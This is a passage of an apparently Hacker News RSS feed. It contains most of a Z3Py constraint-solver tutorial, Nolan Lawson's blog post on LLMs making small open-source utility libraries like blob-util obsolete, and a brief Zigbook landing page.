s.add(x &amp;gt; 1, y &amp;gt; 1, Or(x + y &amp;gt; 3, x - y &amp;lt; 2))
print ("asserted constraints...")
for c in s.assertions():
    print (c)

print (s.check())
print ("statistics for the last check method...")
print (s.statistics())
# Traversing statistics
for k, v in s.statistics():
    print ("%s : %s" % (k, v))
&lt;/code&gt;
    &lt;p&gt;The command check returns sat when Z3 finds a solution for the set of asserted constraints. We say Z3 satisfied the set of constraints. We say the solution is a model for the set of asserted constraints. A model is an interpretation that makes each asserted constraint true. The following example shows the basic methods for inspecting models.&lt;/p&gt;
    &lt;code&gt;x, y, z = Reals('x y z')
s = Solver()
s.add(x &amp;gt; 1, y &amp;gt; 1, x + y &amp;gt; 3, z - x &amp;lt; 10)
print (s.check())

m = s.model()
print ("x = %s" % m[x])

print ("traversing model...")
for d in m.decls():
    print ("%s = %s" % (d.name(), m[d]))
&lt;/code&gt;
    &lt;p&gt;In the example above, the function Reals('x y z') creates the variables. x, y and z. It is shorthand for:&lt;/p&gt;
    &lt;quote&gt;x = Real('x') y = Real('y') z = Real('z')&lt;/quote&gt;
    &lt;p&gt;The expression m[x] returns the interpretation of x in the model m. The expression "%s = %s" % (d.name(), m[d]) returns a string where the first %s is replaced with the name of d (i.e., d.name()), and the second %s with a textual representation of the interpretation of d (i.e., m[d]). Z3Py automatically converts Z3 objects into a textual representation when needed.&lt;/p&gt;
    &lt;p&gt;Z3 supports real and integer variables. They can be mixed in a single problem. Like most programming languages, Z3Py will automatically add coercions converting integer expressions to real ones when needed. The following example demonstrates different ways to declare integer and real variables.&lt;/p&gt;
    &lt;code&gt;x = Real('x')
y = Int('y')
a, b, c = Reals('a b c')
s, r = Ints('s r')
print (x + y + 1 + (a + s))
print (ToReal(y) + c)
&lt;/code&gt;
    &lt;p&gt;The function ToReal casts an integer expression into a real expression.&lt;/p&gt;
    &lt;p&gt;Z3Py supports all basic arithmetic operations.&lt;/p&gt;
    &lt;code&gt;a, b, c = Ints('a b c')
d, e = Reals('d e')
solve(a &amp;gt; b + 2,
      a == 2*c + 10,
      c + b &amp;lt;= 1000,
      d &amp;gt;= e)
&lt;/code&gt;
    &lt;p&gt;The command simplify applies simple transformations on Z3 expressions.&lt;/p&gt;
    &lt;code&gt;x, y = Reals('x y')
# Put expression in sum-of-monomials form
t = simplify((x + y)**3, som=True)
print (t)
# Use power operator
t = simplify(t, mul_to_power=True)
print (t)
&lt;/code&gt;
    &lt;p&gt;The command help_simplify() prints all available options. Z3Py allows users to write option in two styles. The Z3 internal option names start with : and words are separated by -. These options can be used in Z3Py. Z3Py also supports Python-like names, where : is suppressed and - is replaced with _. The following example demonstrates how to use both styles.&lt;/p&gt;
    &lt;code&gt;x, y = Reals('x y')
# Using Z3 native option names
print (simplify(x == y + 2, ':arith-lhs', True))
# Using Z3Py option names
print (simplify(x == y + 2, arith_lhs=True))

print ("\nAll available options:")
help_simplify()
&lt;/code&gt;
    &lt;p&gt;Z3Py supports arbitrarily large numbers. The following example demonstrates how to perform basic arithmetic using larger integer, rational and irrational numbers. Z3Py only supports algebraic irrational numbers. Algebraic irrational numbers are sufficient for presenting the solutions of systems of polynomial constraints. Z3Py will always display irrational numbers in decimal notation since it is more convenient to read. The internal representation can be extracted using the method sexpr(). It displays Z3 internal representation for mathematical formulas and expressions in s-expression (Lisp-like) notation.&lt;/p&gt;
    &lt;code&gt;x, y = Reals('x y')
solve(x + 10000000000000000000000 == y, y &amp;gt; 20000000000000000)

print (Sqrt(2) + Sqrt(3))
print (simplify(Sqrt(2) + Sqrt(3)))
print (simplify(Sqrt(2) + Sqrt(3)).sexpr())
# The sexpr() method is available for any Z3 expression
print ((x + Sqrt(y) * 2).sexpr())
&lt;/code&gt;
    &lt;p&gt;Modern CPUs and main-stream programming languages use arithmetic over fixed-size bit-vectors. Machine arithmetic is available in Z3Py as Bit-Vectors. They implement the precise semantics of unsigned and of signed two-complements arithmetic.&lt;/p&gt;
    &lt;p&gt;The following example demonstrates how to create bit-vector variables and constants. The function BitVec('x', 16) creates a bit-vector variable in Z3 named x with 16 bits. For convenience, integer constants can be used to create bit-vector expressions in Z3Py. The function BitVecVal(10, 32) creates a bit-vector of size 32 containing the value 10.&lt;/p&gt;
    &lt;code&gt;x = BitVec('x', 16)
y = BitVec('y', 16)
print (x + 2)
# Internal representation
print ((x + 2).sexpr())

# -1 is equal to 65535 for 16-bit integers 
print (simplify(x + y - 1))

# Creating bit-vector constants
a = BitVecVal(-1, 16)
b = BitVecVal(65535, 16)
print (simplify(a == b))

a = BitVecVal(-1, 32)
b = BitVecVal(65535, 32)
# -1 is not equal to 65535 for 32-bit integers 
print (simplify(a == b))
&lt;/code&gt;
    &lt;p&gt;In contrast to programming languages, such as C, C++, C#, Java, there is no distinction between signed and unsigned bit-vectors as numbers. Instead, Z3 provides special signed versions of arithmetical operations where it makes a difference whether the bit-vector is treated as signed or unsigned. In Z3Py, the operators &amp;lt;, &amp;lt;=, &amp;gt;, &amp;gt;=, /, % and &amp;gt;&amp;gt; correspond to the signed versions. The corresponding unsigned operators are ULT, ULE, UGT, UGE, UDiv, URem and LShR.&lt;/p&gt;
    &lt;code&gt;# Create to bit-vectors of size 32
x, y = BitVecs('x y', 32)

solve(x + y == 2, x &amp;gt; 0, y &amp;gt; 0)

# Bit-wise operators
# &amp;amp; bit-wise and
# | bit-wise or
# ~ bit-wise not
solve(x &amp;amp; y == ~y)

solve(x &amp;lt; 0)

# using unsigned version of &amp;lt; 
solve(ULT(x, 0))
&lt;/code&gt;
    &lt;p&gt;The operator &amp;gt;&amp;gt; is the arithmetic shift right, and &amp;lt;&amp;lt; is the shift left. The logical shift right is the operator LShR.&lt;/p&gt;
    &lt;code&gt;# Create to bit-vectors of size 32
x, y = BitVecs('x y', 32)

solve(x &amp;gt;&amp;gt; 2 == 3)

solve(x &amp;lt;&amp;lt; 2 == 3)

solve(x &amp;lt;&amp;lt; 2 == 24)
&lt;/code&gt;
    &lt;p&gt;Unlike programming languages, where functions have side-effects, can throw exceptions, or never return, functions in Z3 have no side-effects and are total. That is, they are defined on all input values. This includes functions, such as division. Z3 is based on first-order logic.&lt;/p&gt;
    &lt;p&gt;Given a constraints such as x + y &amp;gt; 3, we have been saying that x and y are variables. In many textbooks, x and y are called uninterpreted constants. That is, they allow any interpretation that is consistent with the constraint x + y &amp;gt; 3.&lt;/p&gt;
    &lt;p&gt;More precisely, function and constant symbols in pure first-order logic are uninterpreted or free, which means that no a priori interpretation is attached. This is in contrast to functions belonging to the signature of theories, such as arithmetic where the function + has a fixed standard interpretation (it adds two numbers). Uninterpreted functions and constants are maximally flexible; they allow any interpretation that is consistent with the constraints over the function or constant.&lt;/p&gt;
    &lt;p&gt;To illustrate uninterpreted functions and constants let us the uninterpreted integer constants (aka variables) x, y. Finally let f be an uninterpreted function that takes one argument of type (aka sort) integer and results in an integer value. The example illustrates how one can force an interpretation where f applied twice to x results in x again, but f applied once to x is different from x.&lt;/p&gt;
    &lt;code&gt;x = Int('x')
y = Int('y')
f = Function('f', IntSort(), IntSort())
solve(f(f(x)) == x, f(x) == y, x != y)
&lt;/code&gt;
    &lt;p&gt;The solution (interpretation) for f should be read as f(0) is 1, f(1) is 0, and f(a) is 1 for all a different from 0 and 1.&lt;/p&gt;
    &lt;p&gt;In Z3, we can also evaluate expressions in the model for a system of constraints. The following example shows how to use the evaluate method.&lt;/p&gt;
    &lt;code&gt;x = Int('x')
y = Int('y')
f = Function('f', IntSort(), IntSort())
s = Solver()
s.add(f(f(x)) == x, f(x) == y, x != y)
print (s.check())
m = s.model()
print ("f(f(x)) =", m.evaluate(f(f(x))))
print ("f(x)    =", m.evaluate(f(x)))
&lt;/code&gt;
    &lt;p&gt;A formula/constraint F is valid if F always evaluates to true for any assignment of appropriate values to its uninterpreted symbols. A formula/constraint F is satisfiable if there is some assignment of appropriate values to its uninterpreted symbols under which F evaluates to true. Validity is about finding a proof of a statement; satisfiability is about finding a solution to a set of constraints. Consider a formula F containing a and b. We can ask whether F is valid, that is whether it is always true for any combination of values for a and b. If F is always true, then Not(F) is always false, and then Not(F) will not have any satisfying assignment (i.e., solution); that is, Not(F) is unsatisfiable. That is, F is valid precisely when Not(F) is not satisfiable (is unsatisfiable). Alternately, F is satisfiable if and only if Not(F) is not valid (is invalid). The following example proves the deMorgan's law.&lt;/p&gt;
    &lt;p&gt;The following example redefines the Z3Py function prove that receives a formula as a parameter. This function creates a solver, adds/asserts the negation of the formula, and check if the negation is unsatisfiable. The implementation of this function is a simpler version of the Z3Py command prove.&lt;/p&gt;
    &lt;code&gt;p, q = Bools('p q')
demorgan = And(p, q) == Not(Or(Not(p), Not(q)))
print (demorgan)

def prove(f):
    s = Solver()
    s.add(Not(f))
    if s.check() == unsat:
        print ("proved")
    else:
        print ("failed to prove")

print ("Proving demorgan...")
prove(demorgan)
&lt;/code&gt;
    &lt;p&gt;Python supports list comprehensions. List comprehensions provide a concise way to create lists. They can be used to create Z3 expressions and problems in Z3Py. The following example demonstrates how to use Python list comprehensions in Z3Py.&lt;/p&gt;
    &lt;code&gt;# Create list [1, ..., 5] 
print ([ x + 1 for x in range(5) ])

# Create two lists containing 5 integer variables
X = [ Int('x%s' % i) for i in range(5) ]
Y = [ Int('y%s' % i) for i in range(5) ]
print (X)

# Create a list containing X[i]+Y[i]
X_plus_Y = [ X[i] + Y[i] for i in range(5) ]
print (X_plus_Y)

# Create a list containing X[i] &amp;gt; Y[i]
X_gt_Y = [ X[i] &amp;gt; Y[i] for i in range(5) ]
print (X_gt_Y)

print (And(X_gt_Y))

# Create a 3x3 "matrix" (list of lists) of integer variables
X = [ [ Int("x_%s_%s" % (i+1, j+1)) for j in range(3) ]
      for i in range(3) ]
pp(X)
&lt;/code&gt;
    &lt;p&gt;In the example above, the expression "x%s" % i returns a string where %s is replaced with the value of i.&lt;/p&gt;
    &lt;p&gt;The command pp is similar to print, but it uses Z3Py formatter for lists and tuples instead of Python's formatter.&lt;/p&gt;
    &lt;p&gt;Z3Py also provides functions for creating vectors of Boolean, Integer and Real variables. These functions are implemented using list comprehensions.&lt;/p&gt;
    &lt;code&gt;X = IntVector('x', 5)
Y = RealVector('y', 5)
P = BoolVector('p', 5)
print (X)
print (Y)
print (P)
print ([ y**2 for y in Y ])
print (Sum([ y**2 for y in Y ]))
&lt;/code&gt;
    &lt;p&gt;In high school, students learn the kinematic equations. These equations describe the mathematical relationship between displacement (d), time (t), acceleration (a), initial velocity (v_i) and final velocity (v_f). In Z3Py notation, we can write these equations as:&lt;/p&gt;
    &lt;quote&gt;d == v_i * t + (a*t**2)/2, v_f == v_i + a*t&lt;/quote&gt;
    &lt;p&gt;Ima Hurryin is approaching a stoplight moving with a velocity of 30.0 m/s. The light turns yellow, and Ima applies the brakes and skids to a stop. If Ima's acceleration is -8.00 m/s2, then determine the displacement of the car during the skidding process.&lt;/p&gt;
    &lt;code&gt;d, a, t, v_i, v_f = Reals('d a t v__i v__f')

equations = [
   d == v_i * t + (a*t**2)/2,
   v_f == v_i + a*t,
]
print ("Kinematic equations:")
print (equations)

# Given v_i, v_f and a, find d
problem = [
    v_i == 30,
    v_f == 0,
    a   == -8
]
print ("Problem:")
print (problem)

print ("Solution:")
solve(equations + problem)
&lt;/code&gt;
    &lt;p&gt;Ben Rushin is waiting at a stoplight. When it finally turns green, Ben accelerated from rest at a rate of a 6.00 m/s2 for a time of 4.10 seconds. Determine the displacement of Ben's car during this time period.&lt;/p&gt;
    &lt;code&gt;d, a, t, v_i, v_f = Reals('d a t v__i v__f')

equations = [
   d == v_i * t + (a*t**2)/2,
   v_f == v_i + a*t,
]

# Given v_i, t and a, find d
problem = [
    v_i == 0,
    t   == 4.10,
    a   == 6
]

solve(equations + problem)

# Display rationals in decimal notation
set_option(rational_to_decimal=True)

solve(equations + problem)
&lt;/code&gt;
    &lt;p&gt;Some low level hacks are very popular with C programmers. We use some of these hacks in the Z3 implementation.&lt;/p&gt;
    &lt;p&gt;This hack is frequently used in C programs (Z3 included) to test whether a machine integer is a power of two. We can use Z3 to prove it really works. The claim is that x != 0 &amp;amp;&amp;amp; !(x &amp;amp; (x - 1)) is true if and only if x is a power of two.&lt;/p&gt;
    &lt;code&gt;x      = BitVec('x', 32)
powers = [ 2**i for i in range(32) ]
fast   = And(x != 0, x &amp;amp; (x - 1) == 0)
slow   = Or([ x == p for p in powers ])
print (fast)
prove(fast == slow)

print ("trying to prove buggy version...")
fast   = x &amp;amp; (x - 1) == 0
prove(fast == slow)
&lt;/code&gt;
    &lt;p&gt;The following simple hack can be used to test whether two machine integers have opposite signs.&lt;/p&gt;
    &lt;code&gt;x      = BitVec('x', 32)
y      = BitVec('y', 32)

# Claim: (x ^ y) &amp;lt; 0 iff x and y have opposite signs
trick  = (x ^ y) &amp;lt; 0

# Naive way to check if x and y have opposite signs
opposite = Or(And(x &amp;lt; 0, y &amp;gt;= 0),
              And(x &amp;gt;= 0, y &amp;lt; 0))

prove(trick == opposite)
&lt;/code&gt;
    &lt;p&gt;Consider the following puzzle. Spend exactly 100 dollars and buy exactly 100 animals. Dogs cost 15 dollars, cats cost 1 dollar, and mice cost 25 cents each. You have to buy at least one of each. How many of each should you buy?&lt;/p&gt;
    &lt;code&gt;# Create 3 integer variables
dog, cat, mouse = Ints('dog cat mouse')
solve(dog &amp;gt;= 1,   # at least one dog
      cat &amp;gt;= 1,   # at least one cat
      mouse &amp;gt;= 1, # at least one mouse
      # we want to buy 100 animals
      dog + cat + mouse == 100,
      # We have 100 dollars (10000 cents):
      #   dogs cost 15 dollars (1500 cents), 
      #   cats cost 1 dollar (100 cents), and 
      #   mice cost 25 cents 
      1500 * dog + 100 * cat + 25 * mouse == 10000)
&lt;/code&gt;
    &lt;p&gt;Sudoku is a very popular puzzle. The goal is to insert the numbers in the boxes to satisfy only one condition: each row, column and 3x3 box must contain the digits 1 through 9 exactly once.&lt;/p&gt;
    &lt;p&gt;The following example encodes the sudoku problem in Z3. Different sudoku instances can be solved by modifying the matrix instance. This example makes heavy use of list comprehensions available in the Python programming language.&lt;/p&gt;
    &lt;code&gt;# 9x9 matrix of integer variables
X = [ [ Int("x_%s_%s" % (i+1, j+1)) for j in range(9) ]
      for i in range(9) ]

# each cell contains a value in {1, ..., 9}
cells_c  = [ And(1 &amp;lt;= X[i][j], X[i][j] &amp;lt;= 9)
             for i in range(9) for j in range(9) ]

# each row contains a digit at most once
rows_c   = [ Distinct(X[i]) for i in range(9) ]

# each column contains a digit at most once
cols_c   = [ Distinct([ X[i][j] for i in range(9) ])
             for j in range(9) ]

# each 3x3 square contains a digit at most once
sq_c     = [ Distinct([ X[3*i0 + i][3*j0 + j]
                        for i in range(3) for j in range(3) ])
             for i0 in range(3) for j0 in range(3) ]

sudoku_c = cells_c + rows_c + cols_c + sq_c

# sudoku instance, we use '0' for empty cells
instance = ((0,0,0,0,9,4,0,3,0),
            (0,0,0,5,1,0,0,0,7),
            (0,8,9,0,0,0,0,4,0),
            (0,0,0,0,0,0,2,0,8),
            (0,6,0,2,0,1,0,5,0),
            (1,0,2,0,0,0,0,0,0),
            (0,7,0,0,0,0,5,2,0),
            (9,0,0,0,6,5,0,0,0),
            (0,4,0,9,7,0,0,0,0))

instance_c = [ If(instance[i][j] == 0,
                  True,
                  X[i][j] == instance[i][j])
               for i in range(9) for j in range(9) ]

s = Solver()
s.add(sudoku_c + instance_c)
if s.check() == sat:
    m = s.model()
    r = [ [ m.evaluate(X[i][j]) for j in range(9) ]
          for i in range(9) ]
    print_matrix(r)
else:
    print ("failed to solve")
&lt;/code&gt;
    &lt;p&gt;The eight queens puzzle is the problem of placing eight chess queens on an 8x8 chessboard so that no two queens attack each other. Thus, a solution requires that no two queens share the same row, column, or diagonal.&lt;/p&gt;
    &lt;code&gt;# We know each queen must be in a different row.
# So, we represent each queen by a single integer: the column position
Q = [ Int('Q_%i' % (i + 1)) for i in range(8) ]

# Each queen is in a column {1, ... 8 }
val_c = [ And(1 &amp;lt;= Q[i], Q[i] &amp;lt;= 8) for i in range(8) ]

# At most one queen per column
col_c = [ Distinct(Q) ]

# Diagonal constraint
diag_c = [ If(i == j,
              True,
              And(Q[i] - Q[j] != i - j, Q[i] - Q[j] != j - i))
           for i in range(8) for j in range(i) ]

solve(val_c + col_c + diag_c)
&lt;/code&gt;
    &lt;p&gt;The install problem consists of determining whether a new set of packages can be installed in a system. This application is based on the article OPIUM: Optimal Package Install/Uninstall Manager. Many packages depend on other packages to provide some functionality. Each distribution contains a meta-data file that explicates the requirements of each package of the distribution. The meta-data contains details like the name, version, etc. More importantly, it contains depends and conflicts clauses that stipulate which other packages should be on the system. The depends clauses stipulate which other packages must be present. The conflicts clauses stipulate which other packages must not be present.&lt;/p&gt;
    &lt;p&gt;The install problem can be easily solved using Z3. The idea is to define a Boolean variable for each package. This variable is true if the package must be in the system. If package a depends on packages b, c and z, we write:&lt;/p&gt;
    &lt;quote&gt;DependsOn(a, [b, c, z])&lt;/quote&gt;
    &lt;p&gt;DependsOn is a simple Python function that creates Z3 constraints that capture the depends clause semantics.&lt;/p&gt;
    &lt;quote&gt;def DependsOn(pack, deps): return And([ Implies(pack, dep) for dep in deps ])&lt;/quote&gt;
    &lt;p&gt;Thus, Depends(a, [b, c, z]) generates the constraint&lt;/p&gt;
    &lt;quote&gt;And(Implies(a, b), Implies(a, c), Implies(a, z))&lt;/quote&gt;
    &lt;p&gt;That is, if users install package a, they must also install packages b, c and z.&lt;/p&gt;
    &lt;p&gt;If package d conflicts with package e, we write Conflict(d, e). Conflict is also a simple Python function.&lt;/p&gt;
    &lt;quote&gt;def Conflict(p1, p2): return Or(Not(p1), Not(p2))&lt;/quote&gt;
    &lt;p&gt;Conflict(d, e) generates the constraint Or(Not(d), Not(e)). With these two functions, we can easily encode the example in the Opium article (Section 2) in Z3Py as:&lt;/p&gt;
    &lt;code&gt;def DependsOn(pack, deps):
    return And([ Implies(pack, dep) for dep in deps ])

def Conflict(p1, p2):
    return Or(Not(p1), Not(p2))

a, b, c, d, e, f, g, z = Bools('a b c d e f g z')

solve(DependsOn(a, [b, c, z]),
      DependsOn(b, [d]),
      DependsOn(c, [Or(d, e), Or(f, g)]),
      Conflict(d, e),
      a, z)
&lt;/code&gt;
    &lt;p&gt;Note that the example contains the constraint&lt;/p&gt;
    &lt;quote&gt;DependsOn(c, [Or(d, e), Or(f, g)]),&lt;/quote&gt;
    &lt;p&gt;The meaning is: to install c, we must install d or e, and f or g&lt;/p&gt;
    &lt;p&gt;Now, we refine the previous example. First, we modify DependsOn to allow us to write DependsOn(b, d) instead of DependsOn(b, [d]). We also write a function install_check that returns a list of packages that must be installed in the system. The function Conflict is also modified. It can now receive multiple arguments.&lt;/p&gt;
    &lt;code&gt;def DependsOn(pack, deps):
    if is_expr(deps):
        return Implies(pack, deps)
    else:
        return And([ Implies(pack, dep) for dep in deps ])

def Conflict(*packs):
    return Or([ Not(pack) for pack in packs ])

a, b, c, d, e, f, g, z = Bools('a b c d e f g z')

def install_check(*problem):
    s = Solver()
    s.add(*problem)
    if s.check() == sat:
        m = s.model()
        r = []
        for x in m:
            if is_true(m[x]):
                # x is a Z3 declaration
                # x() returns the Z3 expression
                # x.name() returns a string
                r.append(x())
        print (r)
    else:
        print ("invalid installation profile")

print ("Check 1")
install_check(DependsOn(a, [b, c, z]),
              DependsOn(b, d),
              DependsOn(c, [Or(d, e), Or(f, g)]),
              Conflict(d, e),
              Conflict(d, g),
              a, z)

print ("Check 2")
install_check(DependsOn(a, [b, c, z]),
              DependsOn(b, d),
              DependsOn(c, [Or(d, e), Or(f, g)]),
              Conflict(d, e),
              Conflict(d, g),
              a, z, g)
&lt;/code&gt;
    &lt;p&gt;Z3Py is part of the Z3 distribution. It is located in the python subdirectory. To use it locally, you have to include the following command in your Python script.&lt;/p&gt;
    &lt;quote&gt;from Z3 import *&lt;/quote&gt;
    &lt;p&gt;The Z3 Python frontend directory must be in your PYTHONPATH environment variable. Z3Py will automatically search for the Z3 library (z3.dll (Windows), libz3.so (Linux), or libz3.dylib (OSX)). You may also initialize Z3Py manually using the command:&lt;/p&gt;
    &lt;quote&gt;init("z3.dll")&lt;/quote&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45947301</guid><pubDate>Sun, 16 Nov 2025 18:38:37 +0000</pubDate></item><item><title>AI is killing privacy. We can't let that happen</title><link>https://www.fastcompany.com/91435189/ai-privacy-openai-tracking-apps</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45947434</guid><pubDate>Sun, 16 Nov 2025 18:56:31 +0000</pubDate></item><item><title>The fate of "small" open source</title><link>https://nolanlawson.com/2025/11/16/the-fate-of-small-open-source/</link><description>&lt;doc fingerprint="2360927dbacf3e3b"&gt;
  &lt;main&gt;
    &lt;p&gt;By far the most popular npm package I’ve ever written is &lt;code&gt;blob-util&lt;/code&gt;, which is ~10 years old and still gets 5+ million weekly downloads.&lt;/p&gt;
    &lt;p&gt;It’s a small collection of utilities for working with &lt;code&gt;Blob&lt;/code&gt;s in JavaScript. I wrote it because I found that PouchDB users were endlessly confused about how to work with &lt;code&gt;Blob&lt;/code&gt;s and how to convert them to strings, &lt;code&gt;ArrayBuffer&lt;/code&gt;s, etc.&lt;/p&gt;
    &lt;p&gt;Given that some 80% of developers are now using AI in their regular work, &lt;code&gt;blob-util&lt;/code&gt; is almost certainly the kind of thing that most developers would just happily have an LLM generate for them. Sure, you could use &lt;code&gt;blob-util&lt;/code&gt;, but then you’d be taking on an extra dependency, with unknown performance, maintenance, and supply-chain risks.&lt;/p&gt;
    &lt;p&gt;And sure enough, Claude will happily spit out whatever &lt;code&gt;Blob&lt;/code&gt; utilities you need when prompted:&lt;/p&gt;
    &lt;p&gt;&amp;gt; Write me a utility function in TypeScript to convert a Blob to an ArrayBuffer. It should return a Promise.&lt;/p&gt;
    &lt;quote&gt;function blobToArrayBuffer(blob: Blob): Promise&amp;lt;ArrayBuffer&amp;gt; { return new Promise((resolve, reject) =&amp;gt; { const reader = new FileReader(); reader.onload = () =&amp;gt; { if (reader.result instanceof ArrayBuffer) { resolve(reader.result); } else { reject(new Error('Failed to read Blob as ArrayBuffer')); } }; reader.onerror = () =&amp;gt; { reject(reader.error); }; reader.readAsArrayBuffer(blob); }); }&lt;/quote&gt;
    &lt;p&gt;Claude’s version is pretty close to the &lt;code&gt;blob-util&lt;/code&gt; version (unsurprising, since it was probably trained on it!). Although it’s much more verbose, unnecessarily checking if &lt;code&gt;readAsArrayBuffer&lt;/code&gt; actually gives you an &lt;code&gt;ArrayBuffer&lt;/code&gt; (although this does make TypeScript happy). To be fair, it also improves on my implementation by directly &lt;code&gt;reject&lt;/code&gt;ing with an error rather than the more awkward &lt;code&gt;onerror&lt;/code&gt; event.&lt;/p&gt;
    &lt;p&gt;Note: for anyone wondering, yes Claude did suggest the new &lt;code&gt;Blob.arrayBuffer()&lt;/code&gt; method, but it also generated the above for “older environments.”&lt;/p&gt;
    &lt;p&gt;I suppose some people would see this as progress: fewer dependencies, more robust code (even if it’s a bit more verbose), quicker turnaround time than the old “search npm, find a package, read the docs, install it” approach.&lt;/p&gt;
    &lt;p&gt;I don’t have any excessive pride in this library, and I don’t particularly care if the download numbers go up or down. But I do think something is lost with the AI approach. When I wrote &lt;code&gt;blob-util&lt;/code&gt;, I took a teacher’s mentality: the README has a cutesy and whimsical tutorial featuring Kirby, in all his blobby glory. (I had a thing for putting Nintendo characters in all my stuff at the time.)&lt;/p&gt;
    &lt;p&gt;The goal wasn’t just to give you a utility to solve your problem (although it does that) – the goal was also to teach people how to use JavaScript effectively, so that you’d have an understanding of how to solve other problems in the future.&lt;/p&gt;
    &lt;p&gt;I don’t know which direction we’re going in with AI (well, ~80% of us; to the remaining holdouts, I salute you and wish you godspeed!), but I do think it’s a future where we prize instant answers over teaching and understanding. There’s less reason to use something like &lt;code&gt;blob-util&lt;/code&gt;, which means there’s less reason to write it in the first place, and therefore less reason to educate people about the problem space.&lt;/p&gt;
    &lt;p&gt;Even now there’s a movement toward putting documentation in an &lt;code&gt;llms.txt&lt;/code&gt; file, so you can just point an agent at it and save your brain cells the effort of deciphering English prose. (Is this even documentation anymore? What is documentation?)&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;I still believe in open source, and I’m still doing it (in fits and starts). But one thing has become clear to me: the era of small, low-value libraries like &lt;code&gt;blob-util&lt;/code&gt; is over. They were already on their way out thanks to Node.js and the browser taking on more and more of their functionality (see &lt;code&gt;node:glob&lt;/code&gt;, &lt;code&gt;structuredClone&lt;/code&gt;, etc.), but LLMs are the final nail in the coffin.&lt;/p&gt;
    &lt;p&gt;This does mean that there’s less opportunity to use these libraries as a springboard for user education (Underscore.js also had this philosophy), but maybe that’s okay. If there’s no need to find a library to, say, group the items in an array, then maybe learning about the mechanics of such libraries is unnecessary. Many software developers will argue that asking a candidate to reverse a binary tree is pointless, since it never comes up in the day-to-day job, so maybe the same can be said for utility libraries.&lt;/p&gt;
    &lt;p&gt;I’m still trying to figure out what kinds of open source are worth writing in this new era (hint: ones that an LLM can’t just spit out on command), and where education is the most lacking. My current thinking is that the most value is in bigger projects, more inventive projects, or in more niche topics not covered in an LLM’s training data. For example, I look back on my work on &lt;code&gt;fuite&lt;/code&gt; and various memory-leak-hunting blog posts, and I’m pretty satisfied that an LLM couldn’t reproduce this, because it requires novel research and creative techniques. (Although who knows: maybe someday an agent will be able to just bang its head against Chrome heap snapshots until it finds the leak. I’ll believe it when I see it.)&lt;/p&gt;
    &lt;p&gt;There’s been a lot of hand-wringing lately about where open source fits in in a world of LLMs, but I still see people pushing the boundaries. For example, a lot of naysayers think there’s no point in writing a new JavaScript framework, since LLMs are so heavily trained on React, but then there goes the indefatigable Dominic Gannaway writing Ripple.js, yet another JavaScript framework (and with some new ideas, to boot!). This is the kind of thing I like to see: humans laughing in the face of the machine, going on with their human thing.&lt;/p&gt;
    &lt;p&gt;So if there’s a conclusion to this meandering blog post (excuse my squishy human brain; I didn’t use an LLM to write this), it’s just that: yes, LLMs have made some kinds of open source obsolete, but there’s still plenty of open source left to write. I’m excited to see what kinds of novel and unexpected things you all come up with.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45947639</guid><pubDate>Sun, 16 Nov 2025 19:21:13 +0000</pubDate></item><item><title>62 chapter open-source Zig book</title><link>https://www.zigbook.net</link><description>&lt;doc fingerprint="755f0c1b2f7c30bf"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Learning Zig is not just about adding a language to your resume.&lt;/head&gt;
    &lt;p&gt;It is about fundamentally changing how you think about software.&lt;/p&gt;
    &lt;p&gt;“You came for syntax.&lt;/p&gt;
    &lt;p&gt;You'll leave with a philosophy.”&lt;/p&gt;
    &lt;p&gt;61 chapters • Project-based • Zero AI • Written by @zigbook&lt;/p&gt;
    &lt;p&gt;zsh — zigbook.net&lt;/p&gt;
    &lt;p&gt;Welcome to Zigbook 🦎&lt;/p&gt;
    &lt;p&gt;Ready to transform how you think about software?&lt;/p&gt;
    &lt;p&gt;Exec: zig build zigbook&lt;/p&gt;
    &lt;p&gt;zigbook %$ &lt;/p&gt;
    &lt;p&gt;Interactive terminal • Type to get started&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45947810</guid><pubDate>Sun, 16 Nov 2025 19:44:27 +0000</pubDate></item></channel></rss>